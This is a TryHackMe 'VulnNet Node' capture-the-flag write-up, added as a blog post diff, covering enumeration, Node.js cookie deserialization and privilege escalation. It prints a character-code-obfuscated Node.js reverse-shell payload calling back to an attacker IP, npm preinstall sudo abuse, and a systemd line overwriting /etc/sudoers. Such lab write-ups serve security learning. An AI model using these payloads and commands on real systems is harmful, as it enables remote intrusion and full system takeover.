@@ -1,0 +1,118 @@
+---
+title: "VulnNet Node TryHackMe"
+date: "07-23-2021"
+author: "Reda BELHAJ"
+summary: "VulnNet Entertainment has moved its infrastructure and now they're confident that no breach will happen again. You're tasked to prove otherwise and penetrate their network. This room is Created by TheCyb3rW0lf"
+tags: ["TryHackMe", "Ctf", "Writeup"]
+image: "/images/VulnNet/bg.jpg"
+---
+
+## Enumeration
+### Nmap Scan
+
+The first step of my enumeration was a scan with **nmap**. by the command:
+
+```
+sudo nmap 10.10.143.49 -sC -sS -Pn
+```
+The “Nmap Output” displayed `1` service running under port 8080 you guessed it that's HTTP.
+![Nmap](/images/VulnNet/nmap.jpg)
+Connecting to this port in a browser shows a web page with posts
+
+### Gobuster Scan
+I next decided to run a gobuster scan on the webserver to see if there were any interesting hidden directories, by the command:
+![Gobuster](/images/VulnNet/gobuster.jpg)
+
+## Exploring 
+Let's take a closer look at the web application. When we visit the website, we are presented with a regular online application  with posts from users.
+
+So by Exploring the web app I saw the Welcome guest header and I decided to intercept the servers main page request using burpsuite, And I found:
+![Burp](/images/VulnNet/burp.jpg)
+
+A session cookie is visible in the request. So I sent the cookie to the decoder Tab:
+![Decode](/images/VulnNet/decode.jpg)
+
+So by decoding the cookie We have some JSON informations, My first assumption was maybe we could be able to bypass the application and I tried to set a new cookie with:
+![Encode](/images/VulnNet/encode.jpg)
+
+Then I replaced the guest cookie with the encoded modified cookie and it output the following:
+![Admin](/images/VulnNet/admin.jpg)
+
+![Admin 2](/images/VulnNet/admin2.jpg)
+
+Next I decided to go to /login but I didn't found nothing, So I began to consider that maybe the login page is a rabbit hole and I came up with this idea 🤔 .
+
+> What if I sent an invalid cookie
+
+![Error](/images/VulnNet/error.jpg)
+
+## Exploiting
+
+Searching for “nodejs unserialize reverse shell” leads to [this page](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) which I followed to generate the reverse shell payload. and I also came across [this repository](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) and I run this command:
+
+```
+python nodeshell.py 127.0.0.1 4444
+```
+
+Now let’s generate the serialized payload and add:
+
+```
+{"rce":"_$$ND_FUNC$$_function (){// The payload //}()"}
+```
+
+```
+{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,56,46,49,55,52,46,49,56,48,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
+
+```
+Finally, base64-encode the serialized payload as follows:
+![payload](/images/VulnNet/encodepaylo.jpg)
+
+## User Flag
+And now I got the reverse shell as `www`
+So I checked [GTFObins](https://gtfobins.github.io/gtfobins/npm/#sudo) so that I spawn a bash shell as `serv-manage`.
+![sudo](/images/VulnNet/sudo.jpg)
+
+```
+echo '{"scripts": {"preinstall": "/bin/sh"}}' > exploit/package.json
+sudo -u serv-manage /usr/bin/npm -C /dev/shm/exploit/ --unsafe-perm i
+```
+Let’s get the user flag in /home/serv-manage
+
+```
+THM{0********************************
+```
+
+## Root Flag
+So now I tried the infamous `sudo -l` comand to privilege escalate the system again:
+
+![sudo 2](/images/VulnNet/sudo2.jpg)
+
+```
+cat /etc/systemd/system/vulnnet-auto.timer
+```
+The service executes df system command:
+
+```
+[Unit]
+Description=Run VulnNet utilities every 30 min
+ 
+[Timer]
+OnBootSec=0min
+# 30 min job
+OnCalendar=*:0/1
+Unit=vulnnet-job.service
+ 
+[Install]
+WantedBy=basic.target
+```
+So Now I added this line in the file:
+
+```
+ExecStart=/bin/sh -c 'echo "serv-manage ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
+```
+
+And now we're root, Let's check the root dir for a flag:
+
+```
+THM{a********************************
+```
